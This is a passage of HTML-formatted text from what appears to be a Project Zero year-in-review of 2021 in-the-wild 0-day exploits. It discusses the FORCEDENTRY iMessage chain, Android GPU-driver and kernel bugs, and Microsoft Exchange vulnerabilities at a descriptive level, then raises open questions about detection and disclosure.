technique as the one presented.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;The two FORCEDENTRY exploits (&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html\"&gt;CVE-2021-30860&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and the &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.blogspot.com/2022/03/forcedentry-sandbox-escape.html\"&gt;sandbox escape&lt;/a&gt;&lt;/span&gt;&lt;span&gt;) were the only times that made us all go &amp;ldquo;wow!&amp;rdquo; this year. For &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html\"&gt;CVE-2021-30860&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, the integer overflow in CoreGraphics, it was because: &lt;/span&gt;&lt;/p&gt;&lt;ol class=\"c6 lst-kix_qhs0t3wlsx02-0 start\" start=\"1\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;For years we&amp;rsquo;ve all heard about how attackers are using 0-click iMessage bugs and finally we have a public example, and&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;The exploit was an impressive work of art. &lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;The sandbox escape (CVE requested, not yet assigned) was impressive because it&amp;rsquo;s one of the few times we&amp;rsquo;ve seen a sandbox escape in-the-wild that uses only logic bugs, rather than the standard memory corruption bugs. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;For &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html\"&gt;CVE-2021-30860&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, the vulnerability itself wasn&amp;rsquo;t especially notable: a classic integer overflow within the JBIG2 parser of the CoreGraphics PDF decoder. The exploit, though, was described by Samuel Gro&amp;szlig; &amp;amp; Ian Beer as &amp;ldquo;one of the most technically sophisticated exploits [they]&amp;rsquo;ve ever seen&amp;rdquo;. &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html\"&gt;Their blogpost shares all the details&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;, but the highlight is that the exploit uses the logical operators available in JBIG2 to build NAND gates which are used to build its own computer architecture. The exploit then writes the rest of its exploit using that new custom architecture. From their blogpost:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5 HNYIspzEBn-c15\"&gt;&lt;span class=\"HNYIspzEBn-c8\"&gt;Using over 70,000 segment commands defining logical bit operations, they define a small computer architecture with features such as registers and a full 64-bit adder and comparator which they use to search memory and perform arithmetic operations. It&amp;#39;s not as fast as Javascript, but it&amp;#39;s fundamentally computationally equivalent.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2 HNYIspzEBn-c15\"&gt;&lt;span class=\"HNYIspzEBn-c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5 HNYIspzEBn-c15\"&gt;&lt;span class=\"HNYIspzEBn-c8\"&gt;The bootstrapping operations for the sandbox escape exploit are written to run on this logic circuit and the whole thing runs in this weird, emulated environment created out of a single decompression pass through a JBIG2 stream. It&amp;#39;s pretty incredible, and at the same time, pretty terrifying.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;This is an example of what &lt;/span&gt;&lt;span&gt;making 0-day exploitation hard could&lt;/span&gt;&lt;span&gt;&amp;nbsp;look like:&lt;/span&gt;&lt;span&gt;&amp;nbsp;attackers having to develop a new and novel way to exploit a bug and that method requires lots of expertise and/or time to develop.&lt;/span&gt;&lt;span&gt;&amp;nbsp;This year, the two FORCEDENTRY exploits were the only 0-days out of the 58 that really impressed us. Hopefully in the future, the bar has been raised such that this will be required for any successful exploitation.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"HNYIspzEBn-c7\" id=\"h.tyseasm1qg7w\"&gt;&lt;span class=\"HNYIspzEBn-c12\"&gt;Android&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;There were 7 Android in-the-wild 0-days detected and disclosed this year. Prior to 2021 there had only been 1 and it was in 2019: &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2019/CVE-2019-2215.html\"&gt;CVE-2019-2215&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;. Like WebKit, this lack of data makes it hard for us to assess trends and changes. Instead, we&amp;rsquo;ll compare it to public security research.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;For the 7 Android 0-days they targeted the following components:&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c6 lst-kix_3zaknyhdqv25-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span&gt;Qualcomm Adreno GPU driver (&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://source.android.com/security/bulletin/2021-01-01\"&gt;CVE-2020-11261&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2021/CVE-2021-1905.html\"&gt;CVE-2021-1905&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://source.android.com/security/bulletin/2021-05-01\"&gt;CVE-2021-1906&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span&gt;ARM Mali GPU driver (&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://source.android.com/security/bulletin/2021-05-01\"&gt;CVE-2021-28663&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://source.android.com/security/bulletin/2021-05-01\"&gt;CVE-2021-28664&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span&gt;Upstream Linux kernel (&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-1048.html\"&gt;CVE-2021-1048&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://source.android.com/security/bulletin/2021-11-01#kernel-components\"&gt;CVE-2021-0920&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;5 of the 7 0-days from 2021 targeted GPU drivers. This is actually not that surprising when we consider the evolution of the Android ecosystem as well as recent public security research into Android. The Android ecosystem is quite &lt;/span&gt;&lt;span&gt;fragmented&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;: many different kernel versions, different manufacturer customizations, etc. If an attacker wants a capability against &amp;ldquo;Android devices&amp;rdquo;, they generally need to maintain many different exploits to have a decent percentage of the Android ecosystem covered. However, if the attacker chooses to target the GPU kernel driver instead of another component, they will only need to have two exploits since most Android devices use 1 of 2 GPUs: either the Qualcomm Adreno GPU or the ARM Mali GPU. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;Public security research mirrored this choice in the last couple of years as well. &lt;/span&gt;&lt;span&gt;When developing full exploit chains&lt;/span&gt;&lt;span&gt;&amp;nbsp;(for defensive purposes) to target Android devices, &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://github.com/secmob/TiYunZong-An-Exploit-Chain-to-Remotely-Root-Modern-Android-Devices/blob/master/us-20-Gong-TiYunZong-An-Exploit-Chain-to-Remotely-Root-Modern-Android-Devices-wp.pdf\"&gt;Guang Gong&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://securitylab.github.com/research/one_day_short_of_a_fullchain_android/\"&gt;Man Yue Mo&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, and &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.blogspot.com/2020/09/attacking-qualcomm-adreno-gpu.html\"&gt;Ben Hawkes&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;all chose to attack the GPU kernel driver for local privilege escalation. Seeing the in-the-wild 0-days also target the GPU was more of a confirmation rather than a revelation. Of the &lt;/span&gt;&lt;span&gt;5 0-days targeting &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;GPU drivers, 3 were in the Qualcomm Adreno driver and 2 in the ARM Mali driver. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;The two non-GPU driver 0-days (&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://source.android.com/security/bulletin/2021-11-01#kernel-components\"&gt;CVE-2021-0920&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-1048.html\"&gt;CVE-2021-1048&lt;/a&gt;&lt;/span&gt;&lt;span&gt;) targeted the upstream Linux kernel. Unfortunately, these 2 bugs shared a singular characteristic with the Android in-the-wild 0-day seen in 2019: all 3 were previously known upstream before their exploitation in Android. While the sample size is small, it&amp;rsquo;s still quite &lt;/span&gt;&lt;span&gt;striking&lt;/span&gt;&lt;span&gt;&amp;nbsp;to see that 100% of the known in-the-wild Android 0-days that target the kernel &lt;/span&gt;&lt;span&gt;are bugs that actually were known about before their exploitation.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;The vulnerability now referred to as &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://source.android.com/security/bulletin/2021-11-01#kernel-components\"&gt;CVE-2021-0920&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;was actually found in September 2016 and &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://lore.kernel.org/lkml/CAOssrKcfncAYsQWkfLGFgoOxAQJVT2hYVWdBA6Cw7hhO8RJ_wQ@mail.gmail.com/\"&gt;discussed on the Linux kernel mailing lists&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. A &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://lore.kernel.org/lkml/1475150954-10152-1-git-send-email-mszeredi@redhat.com/\"&gt;patch was even developed back in 2016&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, but it didn&amp;rsquo;t end up being submitted. The bug was finally &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=cbcf01128d0a92e131bd09f1688fe032480b65ca\"&gt;fixed in the Linux kernel in July 2021&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;after the detection of the in-the-wild exploit targeting Android. The patch then made it into the &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://source.android.com/security/bulletin/2021-11-01#kernel-components\"&gt;Android security bulletin in November 2021&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-1048.html\"&gt;CVE-2021-1048&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&amp;nbsp;remained unpatched in Android for 14 months after it was patched in the Linux kernel. The Linux kernel was actually only vulnerable to the issue for a few weeks, but due to Android patching practices, that few weeks became almost a year for some Android devices. If an Android OEM synced to the upstream kernel, then they likely were patched against the vulnerability at some point. But many devices, such as recent Samsung devices, had not and thus were left vulnerable.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"HNYIspzEBn-c7\" id=\"h.go76pditpwq7\"&gt;&lt;span&gt;Microsoft &lt;/span&gt;&lt;span&gt;Exchange Server&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;In 2021, there were 5 in-the-wild 0-days targeting Microsoft Exchange Server. This is the first time any Exchange Server in-the-wild 0-days have been detected and disclosed since we began tracking in-the-wild 0-days. The first four (&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-26855.html\"&gt;CVE-2021-26855&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26857\"&gt;CVE-2021-26857&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26858\"&gt;CVE-2021-26858&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, and &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27065\"&gt;CVE-2021-27065&lt;/a&gt;&lt;/span&gt;&lt;span&gt;) &amp;nbsp;were all disclosed and patched at the same time and used together in a &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/\"&gt;single operation&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. &lt;/span&gt;&lt;span&gt;The fifth (&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-42321\"&gt;CVE-2021-42321&lt;/a&gt;&lt;/span&gt;&lt;span&gt;) was patched on its own in November 2021. &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-42321\"&gt;CVE-2021-42321&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;was demonstrated at Tianfu Cup and then discovered in-the-wild by Microsoft. While no other in-the-wild 0-days were disclosed as part of the chain with &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-42321\"&gt;CVE-2021-42321&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, the attackers would have required at least another 0-day for successful exploitation since &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-42321\"&gt;CVE-2021-42321&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&amp;nbsp;is a post-authentication bug.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;Of the four Exchange in-the-wild 0-days used in the first campaign, &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-26855.html\"&gt;CVE-2021-26855&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, which is also known as &amp;ldquo;ProxyLogon&amp;rdquo;, is the only one that&amp;rsquo;s pre-auth. &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-26855.html\"&gt;CVE-2021-26855&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a server side request forgery (SSRF) vulnerability that allows unauthenticated attackers to send arbitrary HTTP requests as the Exchange server. The other three vulnerabilities were post-authentication. For example, &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26858\"&gt;CVE-2021-26858&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27065\"&gt;CVE-2021-27065&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;allowed attackers to write arbitrary files to the system. &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26857\"&gt;CVE-2021-26857&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&amp;nbsp;is a remote code execution vulnerability due to a deserialization bug in the Unified Messaging service. This allowed attackers to run code as the privileged SYSTEM user.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;For the second campaign, &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-42321\"&gt;CVE-2021-42321&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, like &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26858\"&gt;CVE-2021-26858&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;, is a post-authentication RCE vulnerability due to insecure deserialization. It seems that while attempting to harden Exchange, Microsoft inadvertently introduced another deserialization vulnerability.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;While there were a significant amount of 0-days in Exchange detected and disclosed in 2021, it&amp;rsquo;s important to remember that they were all used as 0-day in only two different campaigns. &lt;/span&gt;&lt;span&gt;This is an example of why we don&amp;rsquo;t suggest &lt;/span&gt;&lt;span&gt;using the number&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&amp;nbsp;of 0-days in a product as a metric to assess the security of a product. Requiring the use of four 0-days for attackers to have success is preferable to an attacker only needing one 0-day to successfully gain access.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;While this is the first time Exchange in-the-wild 0-days have been detected and disclosed&lt;/span&gt;&lt;span&gt;&amp;nbsp;since Project Zero began our tracking, this is not unexpected. In 2020 there was &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://www.cisa.gov/uscert/ncas/current-activity/2020/03/10/unpatched-microsoft-exchange-servers-vulnerable-cve-2020-0688\"&gt;n-day exploitation of Exchange Servers&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. Whether this was the first year that attackers began the 0-day exploitation or if this was the first year that defenders began detecting the 0-day exploitation, this is not an unexpected evolution and we&amp;rsquo;ll likely see it continue into 2022.&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"HNYIspzEBn-c11\" id=\"h.1cg90di44ry5\"&gt;&lt;span&gt;Outstanding Questions&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;While there has been progress on detection and disclosure, that progress has shown just how much work there still is to do. The more data we gained, the more questions that arose about biases in detection, what we&amp;rsquo;re missing and why, and the need for more transparency from both vendors and researchers.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;Until the day that attackers decide to happily share all their exploits with us, we can&amp;rsquo;t fully know what percentage of 0-days are &lt;/span&gt;&lt;span&gt;publicly known about&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;. However when we pull together our expertise as security researchers and anecdotes from others in the industry, it paints a picture of some of the data we&amp;rsquo;re very likely missing. From that, these are some of the key questions we&amp;rsquo;re asking ourselves as we move into 2022:&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"HNYIspzEBn-c7\" id=\"h.9mkiyelw2l4a\"&gt;&lt;span class=\"HNYIspzEBn-c12\"&gt;Where are the [x] 0-days?&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;Despite the number of 0-days found in 2021, there are key targets missing from the 0-days discovered. For example, we know that messaging applications like WhatsApp, Signal, Telegram, etc. are targets of interest to attackers and yet there&amp;rsquo;s only 1 messaging app, in this case iMessage, 0-day found this past year. Since we began tracking in mid-2014 the total is two: a WhatsApp 0-day in 2019 and this iMessage 0-day found in 2021.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;Along with messaging apps, there are other platforms/targets we&amp;rsquo;d expect to see 0-days targeting, yet there are no or very few public examples. For example, since mid-2014 there&amp;rsquo;s only one in-the-wild 0-day each for macOS and &lt;/span&gt;&lt;span&gt;Linux&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;. There are no known in-the-wild 0-days targeting cloud, CPU vulnerabilities, or other phone components such as the WiFi chip or the baseband.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;This leads to the question of whether these 0-days are absent due to lack of detection, lack of disclosure, or both?&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"HNYIspzEBn-c7\" id=\"h.lmeqy4ji80fr\"&gt;&lt;span class=\"HNYIspzEBn-c12\"&gt;Do some vendors have no known in-the-wild 0-days because they&amp;rsquo;ve never been found or because they don&amp;rsquo;t publicly disclose?&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;Unless a vendor has told us that they will publicly disclose exploitation status for all vulnerabilities in their platforms, we, the public, don&amp;rsquo;t know if the absence of an annotation means that there is no known exploitation of a vulnerability or if there is, but the vendor is just not sharing that information publicly. &lt;/span&gt;&lt;span&gt;Thankfully this question is something that has a pretty clear solution: all device and software vendors agreeing to publicly disclose when there is evidence to suggest that a vulnerability in their product is being exploited in-the-wild.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"HNYIspzEBn-c7\" id=\"h.dckkx2d1dyz5\"&gt;&lt;span class=\"HNYIspzEBn-c12\"&gt;Are we seeing the same bug patterns because that&amp;rsquo;s what we know how to detect?&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;As we described earlier in this report, all the 0-days we saw in 2021 had similarities to previously seen vulnerabilities. This leads us to wonder whether or not that&amp;rsquo;s actually representative of what attackers are using. Are attackers actually having success exclusively using vulnerabilities in bug classes and components that are previously public? Or are we detecting all these 0-days with known bug patterns because that&amp;rsquo;s what we know how to detect? Public security research would suggest that yes, attackers are still able to have success with using vulnerabilities in known components and bug classes the majority of the time. But we&amp;rsquo;d still expect to see a few novel and unexpected vulnerabilities in the grouping. We posed this question back in the 2019 year-in-review and it still lingers. &lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"HNYIspzEBn-c7\" id=\"h.w9alsmed3bqy\"&gt;&lt;span class=\"HNYIspzEBn-c12\"&gt;Where are the spl0itz?&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;To successfully exploit a vulnerability there are two key pieces that make up that exploit: the vulnerability being exploited, and the exploitation method (how that 